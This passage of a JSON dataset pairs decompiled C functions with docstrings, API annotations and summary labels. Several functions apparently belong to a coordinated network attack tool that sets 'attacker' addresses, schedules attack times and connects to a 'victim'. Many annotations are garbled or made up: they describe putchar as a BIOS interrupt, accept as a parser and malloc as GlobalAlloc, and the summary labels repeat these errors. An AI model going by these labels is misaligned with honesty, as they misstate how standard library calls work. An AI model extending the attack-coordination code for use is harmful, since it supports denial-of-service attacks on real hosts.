            "socket",
            "thread",
            "handler",
            ",",
            "and",
            "waits",
            "for",
            "the",
            "thread",
            "to",
            "finish",
            "before",
            "exiting",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "size_t",
            "v3",
            ";",
            "int",
            "port",
            ";",
            "pthread_t",
            "socketth",
            ";",
            "char",
            "buffer",
            "[",
            "256",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "v8",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "argc",
            "<",
            "=",
            "1",
            ")",
            "{",
            "fwrite",
            "(",
            "\"ERROR, no port provided\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x18uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "timer_init",
            "(",
            ")",
            ";",
            "__isoc99_sscanf",
            "(",
            "argv",
            "[",
            "1",
            "]",
            ",",
            "\"%d\"",
            ",",
            "&",
            "port",
            ")",
            ";",
            "socket_init",
            "(",
            "port",
            ")",
            ";",
            "puts",
            "(",
            "\"\\n---------------------------------------------------------------------\"",
            ")",
            ";",
            "puts",
            "(",
            "\"SET SERVER: Set the server address to attack \"",
            ")",
            ";",
            "printf",
            "(",
            "\"Enter IP address: \"",
            ")",
            ";",
            "memset",
            "(",
            "buffer",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "buffer",
            ")",
            ")",
            ";",
            "__isoc99_scanf",
            "(",
            "\"%s\"",
            ",",
            "buffer",
            ")",
            ";",
            "servername",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x100uL",
            "L",
            ")",
            ";",
            "v3",
            "=",
            "strlen",
            "(",
            "buffer",
            ")",
            ";",
            "strncpy",
            "(",
            "servername",
            ",",
            "buffer",
            ",",
            "v3",
            "+",
            "1",
            ")",
            ";",
            "printf",
            "(",
            "\"Enter Port: \"",
            ")",
            ";",
            "__isoc99_scanf",
            "(",
            "\"%d\"",
            ",",
            "&",
            "portno_cl",
            ")",
            ";",
            "puts",
            "(",
            "\"\\n---------------------------------------------------------------------\"",
            ")",
            ";",
            "puts",
            "(",
            "\"STARTING SERVER FOR THE COORDINATOR TO CONNECT \"",
            ")",
            ";",
            "pthread_create",
            "(",
            "&",
            "socketth",
            ",",
            "0L",
            "L",
            ",",
            "(",
            "void",
            "*",
            "(",
            "*",
            ")",
            "(",
            "void",
            "*",
            ")",
            ")",
            "socketthread_handler",
            ",",
            "\"processing...\"",
            ")",
            ";",
            "pthread_join",
            "(",
            "socketth",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read an unsigned 64-bit value from the FS segment register in x86 assembly, typically used for accessing thread-local storage or other system-specific data structures located in the FS segment.",
            "The \"timer\" function appears to be a part of a larger system, likely a network communication protocol implementation, providing functionality for managing timers, including starting, stopping, and displaying elapsed time of attempts, utilizing a monotonic clock system and storing timestamps in a file.",
            "The `socket_init` function is likely designed to initialize a socket library or package, providing functionalities for socket creation, manipulation, and management, possibly with platform-specific implementations for Windows and Unix-like systems.",
            "The printf function is used to display formatted output to the standard output stream in programming languages such as C and C++.",
            "The provided code snippets and the function name \"malloc\" suggest an implementation of dynamic memory allocation in C, with examples including recursive functions, string manipulation, and matrix operations, showcasing memory management and usage in various contexts.",
            "The `printf` function is being redefined and modified for a specific purpose, likely to handle formatting and output in a custom manner, including for an RPN calculator, and the provided code snippets demonstrate its usage and adaptation within various contexts."
        ],
        "longer_label": "The given code initializes a server on a specified port, prompts the user to set the server address for an attack, creates a thread for socket handling, and waits for the thread to finish execution, likely part of a network communication protocol implementation utilizing thread-local storage and timer management."
    },
    {
        "id": 252,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "called",
            "error",
            "that",
            "prints",
            "an",
            "error",
            "message",
            "using",
            "perror",
            "and",
            "then",
            "exits",
            "the",
            "program",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "error",
            "(",
            "const",
            "char",
            "*",
            "msg",
            ")",
            "{",
            "perror",
            "(",
            "msg",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a function named \"error\" which prints an error message using \"perror\" and terminates the program with exit code 0."
    },
    {
        "id": 253,
        "docstring_tokens": [
            "The",
            "code",
            "prompts",
            "the",
            "user",
            "to",
            "set",
            "the",
            "address",
            "and",
            "port",
            "of",
            "attackers",
            ",",
            "set",
            "times",
            "for",
            "each",
            "attacker",
            ",",
            "send",
            "times",
            "to",
            "each",
            "attacker",
            "via",
            "sockets",
            ",",
            "and",
            "provides",
            "options",
            "to",
            "exit",
            "the",
            "program",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "char",
            "*",
            "*",
            "v3",
            ";",
            "int",
            "*",
            "*",
            "v4",
            ";",
            "char",
            "*",
            "*",
            "v5",
            ";",
            "size_t",
            "v6",
            ";",
            "time_t",
            "v7",
            ";",
            "size_t",
            "v8",
            ";",
            "int",
            "choice",
            ";",
            "int",
            "h",
            ";",
            "int",
            "m",
            ";",
            "int",
            "s",
            ";",
            "int",
            "i",
            ";",
            "int",
            "tempcheck",
            ";",
            "int",
            "sockfd",
            ";",
            "int",
            "n",
            ";",
            "time_t",
            "now",
            ";",
            "char",
            "*",
            "*",
            "servers",
            ";",
            "int",
            "*",
            "*",
            "ports",
            ";",
            "char",
            "*",
            "servername",
            ";",
            "hostent",
            "*",
            "server",
            ";",
            "tm",
            "*",
            "now_tm",
            ";",
            "sockaddr_in",
            "serv_addr",
            ";",
            "time_t",
            "t",
            "[",
            "4",
            "]",
            ";",
            "char",
            "temptime",
            "[",
            "50",
            "]",
            ";",
            "char",
            "buffer",
            "[",
            "256",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v28",
            ";",
            "v28",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "servername",
            "=",
            "\"127.0.0.1\"",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "puts",
            "(",
            "\"\\n---------------------------------------------------------------------\"",
            ")",
            ";",
            "puts",
            "(",
            "\"Options: \\n 1. SET_SERVER: set the address of attackers. \\n 2. SET_TIMES: set time for each attacker \"",
            ")",
            ";",
            "printf",
            "(",
            "\" 3. SEND_TIMES: Send times to each attacker \\n 4. Exit \\n\\n Enter your choice: \"",
            ")",
            ";",
            "tempcheck",
            "=",
            "__isoc99_scanf",
            "(",
            "\"%d\"",
            ",",
            "&",
            "choice",
            ")",
            ";",
            "if",
            "(",
            "choice",
            "=",
            "=",
            "3",
            ")",
            "break",
            ";",
            "if",
            "(",
            "choice",
            ">",
            "3",
            ")",
            "return",
            "0",
            ";",
            "if",
            "(",
            "choice",
            "=",
            "=",
            "1",
            ")",
            "{",
            "servers",
            "=",
            "(",
            "char",
            "*",
            "*",
            ")",
            "malloc",
            "(",
            "0x20uL",
            "L",
            ")",
            ";",
            "ports",
            "=",
            "(",
            "int",
            "*",
            "*",
            ")",
            "malloc",
            "(",
            "0x20uL",
            "L",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v3",
            "=",
            "&",
            "servers",
            "[",
            "i",
            "]",
            ";",
            "*",
            "v3",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x100uL",
            "L",
            ")",
            ";",
            "v4",
            "=",
            "&",
            "ports",
            "[",
            "i",
            "]",
            ";",
            "*",
            "v4",
            "=",
            "(",
            "int",
            "*",
            ")",
            "malloc",
            "(",
            "4uL",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"Please enter address of attacker %d: \"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "i",
            "+",
            "1",
            ")",
            ")",
            ";",
            "memset",
            "(",
            "buffer",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "buffer",
            ")",
            ")",
            ";",
            "__isoc99_scanf",
            "(",
            "\"%s\"",
            ",",
            "buffer",
            ")",
            ";",
            "v5",
            "=",
            "&",
            "servers",
            "[",
            "i",
            "]",
            ";",
            "*",
            "v5",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x100uL",
            "L",
            ")",
            ";",
            "v6",
            "=",
            "strlen",
            "(",
            "buffer",
            ")",
            ";",
            "strncpy",
            "(",
            "servers",
            "[",
            "i",
            "]",
            ",",
            "buffer",
            ",",
            "v6",
            "+",
            "1",
            ")",
            ";",
            "printf",
            "(",
            "\"Enter Port: \"",
            ")",
            ";",
            "__isoc99_scanf",
            "(",
            "\"%d\"",
            ",",
            "ports",
            "[",
            "i",
            "]",
            ")",
            ";",
            "}",
            "}",
            "else",
            "{",
            "if",
            "(",
            "choice",
            "!",
            "=",
            "2",
            ")",
            "return",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "printf",
            "(",
            "\"Please enter time in 24-hour format (hh:mm:ss) for server %d: \"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "i",
            "+",
            "1",
            ")",
            ")",
            ";",
            "__isoc99_scanf",
            "(",
            "\"%d:%d:%d\"",
            ",",
            "&",
            "h",
            ",",
            "&",
            "m",
            ",",
            "&",
            "s",
            ")",
            ";",
            "time",
            "(",
            "&",
            "now",
            ")",
            ";",
            "now_tm",
            "=",
            "localtime",
            "(",
            "&",
            "now",
            ")",
            ";",
            "now_tm",
            "-",
            ">",
            "tm_sec",
            "=",
            "s",
            ";",
            "now_tm",
            "-",
            ">",
            "tm_min",
            "=",
            "m",
            ";",
            "now_tm",
            "-",
            ">",
            "tm_hour",
            "=",
            "h",
            ";",
            "v7",
            "=",
            "mktime",
            "(",
            "now_tm",
            ")",
            ";",
            "t",
            "[",
            "i",
            "]",
            "=",
            "v7",
            ";",
            "}",
            "}",
            "}",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "sockfd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "sockfd",
            "<",
            "0",
            ")",
            "error",
            "(",
            "\"ERROR opening socket\"",
            ")",
            ";",
            "server",
            "=",
            "gethostbyname",
            "(",
            "servers",
            "[",
            "i",
            "]",
            ")",
            ";",
            "if",
            "(",
            "!",
            "server",
            ")",
            "{",
            "fwrite",
            "(",
            "\"ERROR, no such host\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x14uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "serv_addr",
            ".",
            "sin_family",
            "=",
            "2L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "serv_addr",
            ".",
            "sin_zero",
            "=",
            "0L",
            "L",
            ";",
            "memmove",
            "(",
            "&",
            "serv_addr",
            ".",
            "sin_addr",
            ",",
            "*",
            "(",
            "const",
            "void",
            "*",
            "*",
            ")",
            "server",
            "-",
            ">",
            "h_addr_list",
            ",",
            "server",
            "-",
            ">",
            "h_length",
            ")",
            ";",
            "serv_addr",
            ".",
            "sin_port",
            "=",
            "htons",
            "(",
            "*",
            "ports",
            "[",
            "i",
            "]",
            ")",
            ";",
            "if",
            "(",
            "connect",
            "(",
            "sockfd",
            ",",
            "(",
            "const",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "serv_addr",
            ",",
            "0x10u",
            ")",
            "<",
            "0",
            ")",
            "error",
            "(",
            "\"ERROR connecting\"",
            ")",
            ";",
            "sprintf",
            "(",
            "temptime",
            ",",
            "\"%ld\"",
            ",",
            "t",
            "[",
            "i",
            "]",
            ")",
            ";",
            "v8",
            "=",
            "strlen",
            "(",
            "temptime",
            ")",
            ";",
            "n",
            "=",
            "write",
            "(",
            "sockfd",
            ",",
            "temptime",
            ",",
            "v8",
            ")",
            ";",
            "if",
            "(",
            "n",
            "<",
            "0",
            ")",
            "error",
            "(",
            "\"ERROR writing to socket\"",
            ")",
            ";",
            "close",
            "(",
            "sockfd",
            ")",
            ";",
            "}",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function is being redefined and used within a modified source code, likely for a specialized purpose such as formatting outputs in a specific manner or implementing a custom behavior for printing, including handling different system environments."
        ],
        "longer_label": "The provided C code appears to be a client program that interacts with multiple servers based on user input, allowing the user to set server addresses and times, then sends the specified times to each server after establishing connections."
    },
    {
        "id": 254,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "prints",
            "an",
            "error",
            "message",
            "and",
            "exits",
            "the",
            "program",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "error",
            "(",
            "const",
            "char",
            "*",
            "msg",
            ")",
            "{",
            "perror",
            "(",
            "msg",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function called \"error\" which takes a message as input, uses perror to print the message to the standard error, and then exits the program with a status of 1."
    },
    {
        "id": 255,
        "docstring_tokens": [
            "This",
            "function",
            "reads",
            "and",
            "prints",
            "the",
            "contents",
            "of",
            "a",
            "file",
            "containing",
            "student",
            "records",
            ",",
            "and",
            "returns",
            "the",
            "number",
            "of",
            "records",
            "verified",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "FILE",
            "*",
            "records",
            ")",
            "{",
            "char",
            "line",
            "[",
            "128",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "puts",
            "(",
            "\"Students who answered:\"",
            ")",
            ";",
            "while",
            "(",
            "fgets",
            "(",
            "line",
            ",",
            "128",
            ",",
            "records",
            ")",
            ")",
            "printf",
            "(",
            "\"  %s\"",
            ",",
            "line",
            ")",
            ";",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "",
            "The function `putchar` is intended to output a single character `c` to the display using BIOS interrupt `0x10` in 16-bit mode, likely as part of a BIOS-level text mode display driver."
        ],
        "longer_label": "The provided code is a C function `printRecords` that reads lines from a file pointer `records` and outputs them to the console, with a note about the intended use of `putchar` for BIOS-level text mode display."
    },
    {
        "id": 256,
        "docstring_tokens": [
            "The",
            "code",
            "processes",
            "a",
            "thread",
            "handler",
            "that",
            "receives",
            "data",
            "from",
            "a",
            "socket",
            ",",
            "records",
            "the",
            "connection",
            "and",
            "disconnection",
            "times",
            "along",
            "with",
            "the",
            "IP",
            "address",
            ",",
            "and",
            "writes",
            "this",
            "information",
            "to",
            "a",
            "file",
            "while",
            "using",
            "a",
            "mutex",
            "lock",
            "to",
            "prevent",
            "data",
            "corruption",
            "."
        ],
        "code_tokens": [
            "void",
            "*",
            "FUN0",
            "processthread_handler",
            "(",
            "void",
            "*",
            "args",
            ")",
            "{",
            "struct",
            "tm",
            "*",
            "v1",
            ";",
            "struct",
            "tm",
            "*",
            "v2",
            ";",
            "void",
            "*",
            "result",
            ";",
            "socklen_t",
            "fromlen",
            ";",
            "int",
            "newsockfdd",
            ";",
            "int",
            "n",
            ";",
            "time_t",
            "connecttime",
            ";",
            "time_t",
            "disconnecttime",
            ";",
            "char",
            "*",
            "address",
            ";",
            "sockaddr_in",
            "*",
            "tempaddr",
            ";",
            "FILE",
            "*",
            "fp",
            ";",
            "sockaddr",
            "addr",
            ";",
            "char",
            "ipAddress",
            "[",
            "16",
            "]",
            ";",
            "char",
            "buf",
            "[",
            "80",
            "]",
            ";",
            "char",
            "buf1",
            "[",
            "80",
            "]",
            ";",
            "char",
            "ipstr",
            "[",
            "46",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v17",
            ";",
            "v17",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "newsockfdd",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "args",
            ";",
            "time",
            "(",
            "&",
            "connecttime",
            ")",
            ";",
            "n",
            "=",
            "recvfrom",
            "(",
            "newsockfdd",
            ",",
            "ipstr",
            ",",
            "0x100uL",
            "L",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "&",
            "fromlen",
            ")",
            ";",
            "if",
            "(",
            "n",
            "<",
            "0",
            ")",
            "error",
            "(",
            "\"ERROR writing to socket\"",
            ")",
            ";",
            "printf",
            "(",
            "\"%d\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "n",
            ")",
            ";",
            "address",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x100uL",
            "L",
            ")",
            ";",
            "close",
            "(",
            "newsockfdd",
            ")",
            ";",
            "time",
            "(",
            "&",
            "disconnecttime",
            ")",
            ";",
            "v1",
            "=",
            "localtime",
            "(",
            "&",
            "connecttime",
            ")",
            ";",
            "strftime",
            "(",
            "buf",
            ",",
            "0x50uL",
            "L",
            ",",
            "\"%a %Y-%m-%d %H:%M:%S %Z\"",
            ",",
            "v1",
            ")",
            ";",
            "v2",
            "=",
            "localtime",
            "(",
            "&",
            "disconnecttime",
            ")",
            ";",
            "strftime",
            "(",
            "buf1",
            ",",
            "0x50uL",
            "L",
            ",",
            "\"%a %Y-%m-%d %H:%M:%S %Z\"",
            ",",
            "v2",
            ")",
            ";",
            "tempaddr",
            "=",
            "(",
            "sockaddr_in",
            "*",
            ")",
            "&",
            "addr",
            ";",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "addr",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            ",",
            "ipAddress",
            ",",
            "0x10u",
            ")",
            ";",
            "pthread_mutex_lock",
            "(",
            "&",
            "lock",
            ")",
            ";",
            "fp",
            "=",
            "fopen",
            "(",
            "\"conections.txt\"",
            ",",
            "\"a\"",
            ")",
            ";",
            "fprintf",
            "(",
            "fp",
            ",",
            "\"%s \\t%s \\t%s\\n\"",
            ",",
            "ipAddress",
            ",",
            "buf",
            ",",
            "buf1",
            ")",
            ";",
            "fclose",
            "(",
            "fp",
            ")",
            ";",
            "pthread_mutex_unlock",
            "(",
            "&",
            "lock",
            ")",
            ";",
            "free",
            "(",
            "args",
            ")",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__read` appears to be a custom implementation or wrapper around standard input/output operations, possibly for device or file handling, with variations in parameters and functionality across different code snippets, likely intended for system-level operations in a low-level environment.",
            "Based on the function name \"qword\" and the absence of code snippets, it seems that the function is likely intended to perform some operation or manipulation specifically related to 64-bit quantities or quadruple words in a programming context.",
            "The \"local\" function appears to be part of a larger parsing system in a C codebase, likely involved in handling symbolic expressions and parsing actions, distinguishing between local and global symbols, and possibly performing assignments and other parsing-related tasks within a symbolic expression interpreter."
        ],
        "longer_label": "The provided C code defines a thread handler function for processing incoming network connections, logging connection details to a file, utilizing mutex locks for thread safety, and freeing allocated memory, with annotations describing potential custom implementations for input/output operations and manipulation of 64-bit quantities."
    },
    {
        "id": 257,
        "docstring_tokens": [
            "The",
            "function",
            "myrkur_alloc",
            "initializes",
            "a",
            "client",
            "structure",
            "with",
            "a",
            "socket",
            "connection",
            "to",
            "a",
            "specified",
            "host",
            "and",
            "victim",
            ",",
            "with",
            "error",
            "handling",
            "for",
            "socket",
            "creation",
            ",",
            "address",
            "conversion",
            ",",
            "and",
            "connection",
            "establishment",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "*",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "*",
            "a2",
            ",",
            "const",
            "char",
            "*",
            "*",
            "a3",
            ")",
            "{",
            "void",
            "*",
            "*",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "size_t",
            "n",
            ";",
            "size_t",
            "na",
            ";",
            "struct",
            "sockaddr",
            "addr",
            ";",
            "unsigned",
            "__int64",
            "v10",
            ";",
            "v10",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "a1",
            ",",
            "0",
            ",",
            "0x18uL",
            "L",
            ")",
            ";",
            "memset",
            "(",
            "&",
            "addr",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "addr",
            ")",
            ")",
            ";",
            "*",
            "a1",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "a1",
            "[",
            "1",
            "]",
            "=",
            "strtoul",
            "(",
            "a2",
            "[",
            "1",
            "]",
            ",",
            "0L",
            "L",
            ",",
            "10",
            ")",
            ";",
            "if",
            "(",
            "*",
            "a1",
            ">",
            "=",
            "0",
            ")",
            "{",
            "addr",
            ".",
            "sa_family",
            "=",
            "2",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "addr",
            ".",
            "sa_data",
            "=",
            "htons",
            "(",
            "a1",
            "[",
            "1",
            "]",
            ")",
            ";",
            "if",
            "(",
            "inet_pton",
            "(",
            "2",
            ",",
            "*",
            "a2",
            ",",
            "&",
            "addr",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            ")",
            ">",
            "0",
            ")",
            "{",
            "if",
            "(",
            "connect",
            "(",
            "*",
            "a1",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ">",
            "=",
            "0",
            ")",
            "{",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "2",
            ")",
            "=",
            "malloc",
            "(",
            "0x10uL",
            "L",
            ")",
            ";",
            "n",
            "=",
            "strlen",
            "(",
            "*",
            "a3",
            ")",
            ";",
            "v4",
            "=",
            "(",
            "void",
            "*",
            "*",
            ")",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "2",
            ")",
            ";",
            "*",
            "v4",
            "=",
            "malloc",
            "(",
            "n",
            "+",
            "1",
            ")",
            ";",
            "strncpy",
            "(",
            "*",
            "*",
            "(",
            "(",
            "char",
            "*",
            "*",
            "*",
            ")",
            "a1",
            "+",
            "2",
            ")",
            ",",
            "*",
            "a3",
            ",",
            "n",
            ")",
            ";",
            "na",
            "=",
            "strlen",
            "(",
            "a3",
            "[",
            "1",
            "]",
            ")",
            ";",
            "v5",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "2",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "8",
            ")",
            "=",
            "malloc",
            "(",
            "na",
            "+",
            "1",
            ")",
            ";",
            "strncpy",
            "(",
            "*",
            "(",
            "char",
            "*",
            "*",
            ")",
            "(",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "2",
            ")",
            "+",
            "8L",
            "L",
            ")",
            ",",
            "a3",
            "[",
            "1",
            "]",
            ",",
            "na",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "fwrite",
            "(",
            "\"myrkur_alloc(): Error: connect() failed!\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x29uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}",
            "else",
            "{",
            "fwrite",
            "(",
            "\"myrkur_alloc(): Error: inet_pton() failed!\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x2BuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}",
            "else",
            "{",
            "fwrite",
            "(",
            "\"myrkur_alloc(): Error: socket() failed!\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x28uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a quadword (64 bits) from the FS segment register, which is often used in low-level system programming, particularly in accessing thread information blocks or other thread-related data structures in Windows operating systems.",
            "The `memset` function is being defined and utilized in various code snippets to efficiently set a block of memory to a specified value, typically used for zeroing out memory or initializing memory to a specific pattern or value.",
            "The `alloc` function likely manages memory allocation, potentially within a larger system or framework, as indicated by its inclusion of header files, definitions for memory allocation methods (`emalloc`, `erealloc`, `estrdup`), and structures such as `arena`.",
            "The `malloc` function is typically used for dynamic memory allocation in C programs, enabling the allocation of memory space at runtime, as exemplified by the custom implementation provided, which allocates memory using `GlobalAlloc` and `malloc` for various purposes such as binary search, factorial calculation, tree creation, string manipulation, and mathematical computation.",
            "The function `strncpy` is used to copy at most `n` characters from the source string to the destination string, ensuring no more than `n` characters are copied and appending a null character to the destination string, commonly used for safer string copying operations to avoid buffer overflows."
        ],
        "longer_label": "The provided code snippet is a function `myrkur_alloc` that attempts to establish a network connection, allocate memory, and handle errors using low-level system calls and memory operations, with specific annotations highlighting its use of `__readfsqword`, `memset`, and memory allocation functions."
    },
    {
        "id": 258,
        "docstring_tokens": [
            "The",
            "code",
            "creates",
            "a",
            "socket",
            "thread",
            "handler",
            "function",
            "that",
            "binds",
            "a",
            "socket",
            ",",
            "listens",
            "for",
            "incoming",
            "connections",
            ",",
            "accepts",
            "new",
            "connections",
            ",",
            "and",
            "creates",
            "a",
            "new",
            "thread",
            "to",
            "handle",
            "each",
            "connection",
            "."
        ],
        "code_tokens": [
            "void",
            "*",
            "FUN0",
            "__noreturn",
            "socketthread_handler",
            "(",
            "void",
            "*",
            "arg",
            ")",
            "{",
            "pthread_t",
            "processth",
            ";",
            "int",
            "*",
            "new_sock",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "bind",
            "(",
            "sockfd",
            ",",
            "(",
            "const",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "serv_addr",
            ",",
            "0x10u",
            ")",
            "<",
            "0",
            ")",
            "error",
            "(",
            "\"ERROR on binding\"",
            ")",
            ";",
            "listen",
            "(",
            "sockfd",
            ",",
            "5",
            ")",
            ";",
            "clilen",
            "=",
            "16",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "newsockfd",
            "=",
            "accept",
            "(",
            "sockfd",
            ",",
            "(",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "cli_addr",
            ",",
            "&",
            "clilen",
            ")",
            ";",
            "if",
            "(",
            "newsockfd",
            "<",
            "0",
            ")",
            "break",
            ";",
            "new_sock",
            "=",
            "(",
            "int",
            "*",
            ")",
            "malloc",
            "(",
            "1uL",
            "L",
            ")",
            ";",
            "*",
            "new_sock",
            "=",
            "newsockfd",
            ";",
            "if",
            "(",
            "pthread_create",
            "(",
            "&",
            "processth",
            ",",
            "0L",
            "L",
            ",",
            "(",
            "void",
            "*",
            "(",
            "*",
            ")",
            "(",
            "void",
            "*",
            ")",
            ")",
            "processthread_handler",
            ",",
            "new_sock",
            ")",
            "<",
            "0",
            ")",
            "perror",
            "(",
            "\"could not create thread\"",
            ")",
            ";",
            "}",
            "error",
            "(",
            "\"ERROR on accept\"",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read an unsigned 64-bit integer value from the FS segment register at the specified offset, primarily utilized for low-level system programming or kernel development on Intel x86 architectures.",
            "The function \"accept\" appears to be used in different contexts across the provided code snippets, primarily for parsing purposes, where it checks if a given symbol or token matches the current symbol/token being processed and advances the parsing process accordingly.",
            "The `malloc` function appears to be redefined here as an implementation for memory allocation using `GlobalAlloc` with zero initialization, likely for Windows platform, providing dynamic memory allocation capability within the context of the provided C code snippets.",
            "",
            "The function \"cessth\" appears to be a code snippet intended to determine the version of Windows being used and adjust receive buffer settings accordingly, particularly focusing on versions prior to Windows 8 where GetCurrentThreadStackLimits is not available."
        ],
        "longer_label": "The provided C code defines a socket thread handler function utilizing low-level system functions like `__readfsqword`, `bind`, `listen`, and `accept`, with redefined memory allocation using `malloc` for Windows platform, aimed at handling incoming connections and creating threads for processing them."
    },
    {
        "id": 259,
        "docstring_tokens": [
            "The",
            "function",
            "socket_init",
            "initializes",
            "a",
            "socket",
            "using",
            "the",
            "specified",
            "port",
